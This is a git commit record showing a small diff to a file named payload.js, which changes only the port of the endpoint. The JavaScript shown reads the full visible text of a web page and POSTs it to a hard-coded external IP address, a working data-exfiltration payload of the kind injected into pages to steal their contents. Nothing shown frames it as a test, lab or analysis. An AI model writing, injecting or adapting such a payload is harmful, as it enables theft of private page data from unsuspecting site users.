7eb3db172d1462167accfe3390e8c49ef219af06
N7C3TRY <45738080+N7C3TRY@users.noreply.github.com>
2025-04-06 22:23:31 -0500

    Update payload.js
    c

--- payload.js
+++ payload.js
@@ -1,5 +1,5 @@
 let data = document.body.innerText;
-fetch("http://185.196.11.208/log", {
+fetch("http://185.196.11.208:8080/log", {
   method: "POST",
   body: "content=" + encodeURIComponent(data),
   headers: {"Content-Type":"application/x-www-form-urlencoded"}
